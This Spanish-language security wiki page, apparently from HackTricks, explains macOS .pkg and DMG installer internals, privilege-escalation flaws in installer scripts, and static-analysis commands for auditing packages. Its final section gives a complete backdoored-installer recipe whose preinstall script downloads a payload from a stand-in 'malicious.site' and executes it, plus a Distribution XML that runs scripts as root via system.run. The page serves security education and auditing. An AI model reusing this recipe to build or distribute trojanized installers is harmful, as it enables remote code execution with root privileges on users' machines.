# Abuso de macOS Installers

{{#include ../../../banners/hacktricks-training.md}}

## Información básica de los Pkg

Un **installer package** de macOS (también conocido como archivo `.pkg`) es un formato de archivo utilizado por macOS para **distribuir software**. Estos archivos son como una **caja que contiene todo lo que necesita una pieza de software** para instalarse y ejecutarse correctamente.

El archivo del paquete es un archivo comprimido que contiene una **jerarquía de archivos y directorios que se instalarán en el ordenador** objetivo. También puede incluir **scripts** para realizar tareas antes y después de la instalación, como configurar archivos de configuración o limpiar versiones antiguas del software.

### Estructura del paquete

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Personalizaciones (título, texto de bienvenida…) y comprobaciones de scripts/instalación
- **PackageInfo (xml)**: Información, requisitos de instalación, ubicación de instalación y rutas a los scripts que se ejecutarán
- **Bill of materials (bom)**: Lista de archivos que se instalarán, actualizarán o eliminarán, con sus permisos
- **Payload (CPIO archive gzip compressed)**: Archivos que se instalarán en `install-location` de PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Scripts de preinstalación y postinstalación, además de otros recursos extraídos a un directorio temporal para su ejecución.

### Descomprimir
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Para visualizar el contenido del instalador sin descomprimirlo manualmente, también puedes usar la herramienta gratuita [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Atajos para el análisis estático

Si el objetivo es realizar un análisis, intenta **evitar abrir primero el paquete con `Installer.app`**. Algunos paquetes pueden ejecutar código en cuanto Installer los abre (por ejemplo, mediante `system.run()` o plug-ins del instalador), por lo que la extracción offline suele ser el punto de partida más seguro.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## Información básica sobre DMG

Los archivos DMG, o Apple Disk Images, son un formato de archivo utilizado por macOS de Apple para las imágenes de disco. Un archivo DMG es esencialmente una **imagen de disco montable** (contiene su propio sistema de archivos) que contiene datos de bloques sin procesar, normalmente comprimidos y, en ocasiones, cifrados. Cuando abres un archivo DMG, macOS lo **monta como si fuera un disco físico**, permitiéndote acceder a su contenido.

> [!CAUTION]
> Ten en cuenta que los instaladores **`.dmg`** admiten **tantos formatos** que, en el pasado, algunos de ellos que contenían vulnerabilidades fueron abusados para obtener **ejecución de código en el kernel**.

### Estructura de una imagen de disco

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

La jerarquía de un archivo DMG puede variar según el contenido. Sin embargo, para los DMG de aplicaciones, normalmente sigue esta estructura:

- Nivel superior: Es la raíz de la imagen de disco. A menudo contiene la aplicación y posiblemente un enlace a la carpeta Applications.
- Aplicación (.app): Es la aplicación real. En macOS, una aplicación suele ser un paquete que contiene muchos archivos y carpetas individuales que conforman la aplicación.
- Enlace a Applications: Es un acceso directo a la carpeta Applications en macOS. Su propósito es facilitar la instalación de la aplicación. Puedes arrastrar el archivo .app hasta este acceso directo para instalar la aplicación.

## Privesc mediante abuso de pkg

### Ejecución desde directorios públicos

Si un script de preinstalación o postinstalación ejecuta un archivo como **`/var/tmp/Installerutil`** y un atacante puede reemplazarlo, podrá escalar privilegios cuando el instalador lo invoque. Las charlas y el walkthrough muestran variantes de este patrón inseguro de scripts externos.<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Esta es una [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) que varios instaladores y updaters invocan para **ejecutar algo como root**. Esta función acepta como parámetro la **ruta** del **archivo** que se debe **ejecutar**; sin embargo, si un atacante pudiera **modificar** este archivo, podría **abusar** de su ejecución con root para **escalar privilegios**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Para obtener más información, consulta esta charla: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Abuso del entorno y del shebang

Los bugs modernos de PackageKit demostraron que los scripts de instalación a menudo se ejecutan como **código root de confianza**, aunque siguen manteniendo cerca un contexto controlado por el atacante. Al auditar paquetes de proveedores, presta especial atención a:

- Intérpretes de shell como `#!/bin/zsh` / `#!/bin/bash`
- Llamadas como `sudo -u $USER`, `launchctl asuser`, o cualquier lógica que confíe en `$USER`, `$HOME`, `PATH`, `TMPDIR` o rutas relativas
- Intérpretes que no sean de shell y que puedan cargar archivos de inicialización o libraries controlados por el usuario
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Para el bug de entorno root de PackageKit de 2024 (herencia de `~/.zshenv` / `~/.bash*` durante instalaciones iniciadas por el usuario), consulta [la página genérica de macOS privesc](../macos-privilege-escalation.md). Si el paquete está **firmado por Apple**, el mismo bug de script puede volverse **relevante para SIP/TCC** porque `system_installd` puede llevar `com.apple.rootless.install.heritable`; consulta [la página de SIP](../macos-security-protections/macos-sip.md).<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

### Ejecución mediante montaje

Si un instalador escribe en `/tmp/fixedname/bla/bla`, es posible **crear un montaje** sobre `/tmp/fixedname` con noowners para poder **modificar cualquier archivo durante la instalación** y abusar del proceso de instalación.

Un ejemplo de esto es **CVE-2021-26089**, que logró **sobrescribir un script periódico** para obtener ejecución como root. Para obtener más información, consulta la charla: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## pkg como malware

### Payload vacío

Es posible simplemente generar un archivo **`.pkg`** con **scripts de preinstalación y postinstalación** sin ningún Payload real aparte del malware incluido en los scripts.<sup>[[2]](#references)</sup>

### JS en el XML de Distribution

Es posible añadir etiquetas **`<script>`** en el archivo **XML de Distribution** del paquete; ese código se ejecutará y podrá **ejecutar comandos** usando **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

En los paquetes de Distribution, esto normalmente depende de que el archivo `Distribution` de nivel superior habilite scripts externos, por ejemplo con `allow-external-scripts="true"`. Por lo tanto, revisar únicamente `preinstall` / `postinstall` no es suficiente: el propio **XML de Distribution** puede contener hooks `installation-check` / `volume-check` y rutas de ejecución directas mediante `system.run()` / `system.runOnce()`.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Instalador con backdoor

Instalador malicioso que usa un script y código JS dentro de dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [1] [DEF CON 27 - Desempaquetando Pkgs: una mirada al interior de los paquetes de instalación de macOS y fallos de seguridad comunes](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: "El mundo salvaje de los instaladores de macOS" - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Desempaquetando Pkgs: una mirada al interior de los paquetes de instalación de MacOS](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – Red Teaming en macOS: explotando paquetes de instalación](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: escalada de privilegios en PackageKit de macOS](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Rompiendo SIP con paquetes firmados por Apple](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: "Montaña de Bugs" - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - Muerte por 1000 instaladores en macOS y todo está roto](https://www.youtube.com/watch?v=lTOItyjTTkw)
{{#include ../../../banners/hacktricks-training.md}}
